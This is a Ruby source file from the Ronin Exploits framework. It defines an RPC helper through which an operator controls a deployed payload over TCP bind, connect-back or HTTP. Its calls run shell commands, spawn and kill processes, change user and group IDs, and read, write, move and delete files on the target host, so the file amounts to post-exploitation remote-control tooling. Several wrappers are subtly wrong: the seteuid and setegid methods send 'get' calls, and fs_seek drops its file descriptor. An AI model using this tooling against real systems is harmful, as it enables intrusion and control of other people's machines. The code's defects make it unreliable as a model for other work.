#
# Ronin Exploits - A Ruby library for Ronin that provides exploitation and
# payload crafting functionality.
#
# Copyright (c) 2007-2012 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# This file is part of Ronin Exploits.
#
# Ronin is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ronin is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ronin.  If not, see <http://www.gnu.org/licenses/>
#

require 'ronin/network/mixins/tcp'
require 'ronin/network/mixins/http'
require 'ronin/formatting/extensions/binary/base64'

require 'uri/http'
require 'uri/query_params'
require 'json'

module Ronin
  module Payloads
    module Helpers
      #
      # Helper methods for interacting with RPC Servers.
      #
      module RPC
        include OpenNamespace

        def self.extended(object)
          object.extend Network::TCP
          object.extend Network::HTTP

          object.instance_eval do
            parameter :transport, :type        => Symbol,
                                  :description => 'RPC Transport [tcp_server, tcp_connect_back, http]'

            parameter :host, :type        => String,
                             :description => 'RPC host'

            parameter :port, :type        => Integer,
                             :description => 'RPC port'

            parameter :local_host, :type        => String,
                                   :default     => '0.0.0.0',
                                   :description => 'Local RPC host'

            parameter :local_port, :type        => Integer,
                                   :description => 'Local RPC port'

            parameter :rpc, :type        => Hash[Symbol => String],
                            :default     => {},
                            :description => 'RPC options'

            deploy { rpc_connect }

            evacuate { rpc_disconnect }
          end
        end

        #
        # @return [URI::HTTP]
        #   The URL to the HTTP RPC Server.
        #
        def rpc_url
          if transport == :http
            URI::HTTP.build(
              :host => self.host,
              :port => self.port,
              :path => rpc.fetch(:path,'/')
            )
          end
        end

        #
        # Creates a URL for the RPC message.
        #
        # @return [URI::HTTP]
        #   The URL including the RPC message.
        #
        def rpc_url_for(message)
          if transport == :http
            url = rpc_url
            url.query_params = {
              rpc.fetch(:query_param,'_request') => rpc_serialize(message)
            }

            return url
          end
        end

        #
        # Performs an RPC method call.
        #
        # @param [String] name
        #   The RPC method name.
        #
        # @param [Array] arguments
        #   Additional arguments.
        #
        # @return [Object]
        #   The return value.
        #
        # @raise [RuntimeError]
        #   The exception raised.
        #
        def rpc_call(name,*arguments)
          response = rpc_send(:name => name, :arguments => arguments)

          if response['exception']
            raise(response['exception'])
          end

          return response['return']
        end

        def process_getpid;        rpc_call('process.getpid');       end
        def process_getppid;       rpc_call('process.getppid');      end
        def process_getuid;        rpc_call('process.getuid');       end
        def process_setuid(uid);   rpc_call('process.setuid',uid);   end
        def process_geteuid;       rpc_call('process.geteuid');      end
        def process_seteuid(euid); rpc_call('process.geteuid',euid); end
        def process_getgid;        rpc_call('process.getgid');       end
        def process_setgid(gid);   rpc_call('process.setgid',gid);   end
        def process_getegid;       rpc_call('process.getegid');      end
        def process_setegid(egid); rpc_call('process.getegid',egid); end
        def process_getsid;        rpc_call('process.getsid');       end
        def process_setsid(sid);   rpc_call('process.setsid',sid);   end
        def process_getenv(name);  rpc_call('process.getenv',name);  end
        def process_setenv(name,value)
          rpc_call('process.setenv',name,value)
        end
        def process_unsetenv(name); rpc_call('process.unsetenv',name); end

        def process_kill(pid,signal='KILL')
          rpc_call('process.kill',pid,signal)
        end
        def process_getcwd;     rpc_call('process.getcwd');    end
        def process_chdir(dir); rpc_call('process.chdir',dir); end
        def process_time;       rpc_call('process.time');      end
        def process_spawn(program,*arguments)
          rpc_call('process.spawn',program,*arguments)
        end
        def process_exit; rpc_call('process.exit'); end

        def fs_open(path,mode);     rpc_call('fs.open',path,mode);    end
        def fs_read(fd,pos);        rpc_call('fs.read',fd,pos);       end
        def fs_write(fd,pos,data);  rpc_call('fs.write',fd,pos,data); end
        def fs_close(fd);           rpc_call('fs.close',fd);          end
        def fs_seek(fd,pos,whence); rpc_call('fs.seek',pos,whence);   end
        def fs_tell(fd);            rpc_call('fs.tell',fd);           end

        def fs_getcwd;         rpc_call('fs.getcwd');        end
        def fs_chdir(path);    rpc_call('fs.chdir',path);    end
        def fs_readlink(path); rpc_call('fs.readlink',path); end
        def fs_readdir(path);  rpc_call('fs.readdir',path);  end
        def fs_stat(path);     rpc_call('fs.stat',path);     end
        def fs_glob(pattern);  rpc_call('fs.glob',pattern);  end

        def fs_mktemp(basename);     rpc_call('fs.mktemp',basename);     end
        def fs_mkdir(path);          rpc_call('fs.mkdir',path);          end
        def fs_copy(src,dest);       rpc_call('fs.copy',src,dest);       end
        def fs_unlink(path);         rpc_call('fs.unlink',path);         end
        def fs_rmdir(path);          rpc_call('fs.rmdir',path);          end
        def fs_move(src,dest);       rpc_call('fs.move',src,dest);       end
        def fs_link(src,dest);       rpc_call('fs.link',src,dest);       end
        def fs_chown(user,path);     rpc_call('fs.chown',user,path);     end
        def fs_chgrp(group,path);    rpc_call('fs.chgrp',group,path);    end
        def fs_chmod(mode,path);     rpc_call('fs.chmod',mode,path);     end
        def fs_compare(path1,path2); rpc_call('fs.compare',path1,path2); end

        def shell_exec(program,*arguments)
          rpc_call('shell.exec',program,*arguments)
        end
        def shell_write(data)
          rpc_call('shell.write',data)
        end

        protected

        #
        # Encodes an RPC message.
        #
        # @param [Hash] message
        #   The message to encode.
        #
        # @return [String]
        #   The encoded message.
        #
        def rpc_serialize(message)
          Base64.urlsafe_encode64(message.to_json)
        end

        #
        # Decodes an RPC message.
        #
        # @param [String] data
        #   The message to decode.
        #
        # @return [Hash]
        #   The decoded message.
        #
        def rpc_deserialize(data)
          JSON.parse(Base64.decode64(data))
        end

        #
        # Connects to the TCP Server.
        #
        def rpc_connect
          case transport
          when :tcp_server
            @connection = tcp_connect(self.host,self.port)
          when :tcp_connect_back
            @server     = tcp_server(self.port,self.host)
            @connection = @server.accept
          end
        end

        #
        # Disconnects from the TCP Server.
        #
        def rpc_disconnect
          case transport
          when :tcp_server
            @connection.close
            @connection = nil
          when :tcp_connect_back
            if @connection
              @connection.close
              @connection = nil
            end

            @server.close
            @server = nil
          end
        end

        #
        # Sends the message to the HTTP RPC Server.
        #
        # @param [Hash] message
        #   The RPC message to send.
        #
        # @return [Hash]
        #   The response RPC message.
        #
        def rpc_send(message)
          case transport
          when :tcp_server, :tcp_connect_back
            @connection.write(rpc_serialize(message) + "\0")

            response = @connection.readline("\0").chomp("\0")
          when :http
            response_tag = rpc.fetch(:response_tag,'rpc-response')
            response     = http_get_body(:url => rpc_url_for(message))

            if response_tag
              # regexp to extract the response from within HTTP output
              response_extractor = /<#{response_tag}>([^<]+)<\/#{response_tag}>/

              if (match = response.match(response_extractor))
                response = match[1]
              end
            end
          end

          return rpc_deserialize(response)
        end
      end
    end
  end
end
